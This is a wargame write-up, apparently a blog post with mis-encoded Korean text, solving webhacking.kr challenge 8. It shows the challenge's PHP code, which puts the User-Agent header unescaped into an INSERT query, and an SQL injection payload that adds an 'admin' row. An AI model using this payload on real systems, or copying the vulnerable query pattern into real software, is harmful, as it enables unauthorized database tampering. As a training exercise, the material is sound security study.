---
title: "[webhacking.kr] 8ë²ˆ ë¬¸ì œ í’€ì´[SQL]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - SQL
toc: true
toc_sticky: true
toc_label: "8ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
---

ğŸ’¡ Webhacking.kr challenge(old) 7ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ

## ë¬¸ì œ í™”ë©´
![image](https://user-images.githubusercontent.com/33647663/150669805-ed40d507-aaab-427f-a3d4-a17790bde07b.png)


## ì†ŒìŠ¤ì½”ë“œ
 ```php
  <?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 8</title>
<style type="text/css">
body { background:black; color:white; font-size:10pt; }
</style>
</head>
<body>
<br><br>
<center>
<?php
$agent=trim(getenv("HTTP_USER_AGENT"));
$ip=$_SERVER['REMOTE_ADDR'];
if(preg_match("/from/i",$agent)){
  echo("<br>Access Denied!<br><br>");
  echo(htmlspecialchars($agent));
  exit();
}
$db = dbconnect();
$count_ck = mysqli_fetch_array(mysqli_query($db,"select count(id) from chall8"));
if($count_ck[0] >= 70){ mysqli_query($db,"delete from chall8"); }

$result = mysqli_query($db,"select id from chall8 where agent='".addslashes($_SERVER['HTTP_USER_AGENT'])."'");
$ck = mysqli_fetch_array($result);

if($ck){
  echo "hi <b>".htmlentities($ck[0])."</b><p>";
  if($ck[0]=="admin"){
    mysqli_query($db,"delete from chall8");
    solve(8);
  }
}

if(!$ck){
  $q=mysqli_query($db,"insert into chall8(agent,ip,id) values('{$agent}','{$ip}','guest')") or die("query error");
  echo("<br><br>done!  ({$count_ck[0]}/70)");
}
?>
<a href=./?view_source=1>view-source</a>
</body>
</html>

 ```

# í’€ì´

## ë¬¸ì œ ë¶„ì„
  ë¬¸ì œë¥¼ í•´ê²°í•˜ê¸° ìœ„í•œ solveí•¨ìˆ˜ê°€ í˜¸ì¶œë˜ëŠ” ë¶€ë¶„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.
  ```php
  $agent=trim(getenv("HTTP_USER_AGENT")); // ë‚˜ì˜ íŒ¨í‚·ì—ì„œ USER_AGENT ê°’ì„ ì¶”ì¶œ
  $ip=$_SERVER['REMOTE_ADDR']; // ë‚˜ì˜ IP ì¶”ì¶œ
  if(preg_match("/from/i",$agent)){ //agent ì—ì„œ from ë¬¸ìì—´ í•„í„°ë§
    echo("<br>Access Denied!<br><br>");
    echo(htmlspecialchars($agent));
    exit();
  }
  $db = dbconnect();

  $result = mysqli_query($db,"select id from chall8 where agent='".addslashes($_SERVER['HTTP_USER_AGENT'])."'");
  $ck = mysqli_fetch_array($result);
  // user_agent ê°’ì„ ê¸°ì¤€ìœ¼ë¡œ idë¥¼ ë¶ˆëŸ¬ì˜´
  if($ck){
    echo "hi <b>".htmlentities($ck[0])."</b><p>";
    if($ck[0]=="admin"){
      mysqli_query($db,"delete from chall8");
      solve(8);
    }
  }
  // í•´ë‹¹ ì¿¼ë¦¬ ê²°ê³¼ë¡œ idê°’ì´ 'admin'ì´ë©´ solve;

  if(!$ck){
  $q=mysqli_query($db,"insert into chall8(agent,ip,id) values('{$agent}','{$ip}','guest')") or die("query error");
  echo("<br><br>done!  ({$count_ck[0]}/70)");
  }
  // ë§Œì•½ ì¿¼ë¦¬ ê²°ê³¼ê°€ ì—†ë‹¤ë©´ í˜„ì¬ ë‚´ user_agent,ipë¥¼ ê¸°ì¤€ìœ¼ë¡œ 'guest' ìœ ì €ë¥¼ dbì— ì €ì¥í•œë‹¤.
  ```

  ìœ„ ë¶€ë¶„ì„ ë³´ë‹ˆ, ì €ì˜ user_agent ê°’ì„ ê¸°ì¤€ìœ¼ë¡œ DBì—ì„œ ì¿¼ë¦¬ë¥¼ í–ˆì„ ë•Œ idê°€ 'admin'ì´ì–´ì•¼ í•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  ì €ì˜ user_agent ê°’ì´ insert ë¬¸ìœ¼ë¡œ DBì— ì €ì¥ë˜ê¸° ë•Œë¬¸ì— ì´ ë¶€ë¶„ì„ ìš°íšŒí•˜ì—¬ ê³„ì •ì„ 'guest'ê°€ ì•„ë‹Œ 'admin'ìœ¼ë¡œ ì €ì¥í•´ ë³´ê² ìŠµë‹ˆë‹¤.
  
  ë¨¼ì € user_agent ê°’ì„ ë³€ì¡°í•˜ê¸° ìœ„í•´ì„œëŠ” Burp Suite ê°™ì€ í”„ë¡ì‹œ íˆ´ì„ ì´ìš©í•´ì„œ íŒ¨í‚·ì„ ì¡ì•„ì•¼ í•©ë‹ˆë‹¤.

  ì•„ë˜ ê·¸ë¦¼ì—ì„œ ë³´ì´ëŠ” ë¶€ë¶„ì´ ì•„ë¬´ëŸ° ë³€ì¡°ë¥¼ í•˜ì§€ ì•Šì•˜ì„ ë•Œ ì„œë²„ë¡œ ë‚ ì•„ê°€ëŠ” ì €ì˜ íŒ¨í‚· ì…ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150669956-689c1003-ca20-4d9a-9723-4894787aaa43.png)

  ```md
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
  ```
  ê¸°ë³¸ User-Agent ê°’ì€ ìœ„ì™€ ê°™ìœ¼ë©° ì´ ë‚´ìš©ì„ ì´ìš©í•´ì„œ insert ë¶€ë¶„ì„ ìš°íšŒí•´ ë³´ê² ìŠµë‹ˆë‹¤.

  ë¨¼ì € ìœ„ì˜ ë‚´ìš©ì´ ì„œë²„ë¡œ ì „ë‹¬ë˜ë©´ ì„œë²„ì—ì„œëŠ” ë‹¤ìŒ SQLë¬¸ì´ ì‘ë™í•©ë‹ˆë‹¤.

  ```sql
  "insert into chall8(agent,ip,id) values('{$agent}','{$ip}','guest')"
  ```

  ìœ„ì—ì„œ $agent ë¶€ë¶„ì„ ë‹¤ìŒê³¼ ê°™ì´ ë„£ì–´ì£¼ê² ìŠµë‹ˆë‹¤.

  ```md
  1234','1','admin'),('5678
  ```
  $agent ë¶€ë¶„ì„ ìœ„ì˜ ë¬¸ìì—´ì„ ëŒ€ì…í•´ ë³´ë©´ ì„œë²„ìª½ì—ì„œ ë™ì‘í•˜ëŠ” sql ë¬¸ì€ ë‹¤ìŒê³¼ ê°™ì´ ë³€ì¡°ê°€ ë©ë‹ˆë‹¤.
  ```sql
  "insert into chall8(agent,ip,id) values('1234','1','admin'),('5678','{$ip}','guest')"
  ```

  ì´ë¥¼ ì´ìš©í•´ì„œ ì‹¤ì œë¡œ íŒ¨í‚·ì„ ë³€ì¡°í•´ì„œ ë³´ë‚´ ë³´ê² ìŠµë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150670144-578291ae-2450-49d5-8e3c-bd69b7f04df7.png)

  
  ì´ì œ ì„œë²„ë¡œ User-Agent ê°’ì„ 1234ë¥¼ ë³´ë‚´ë©´ ë©ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150670228-c846e50b-6fd9-4545-b6a7-28ec6823a14b.png)

  ê·¸ëŸ¬ë©´ ë¬¸ì œê°€ í’€ë¦½ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/150670275-c7f13551-bbfa-4054-84d2-45eb731227bd.png)

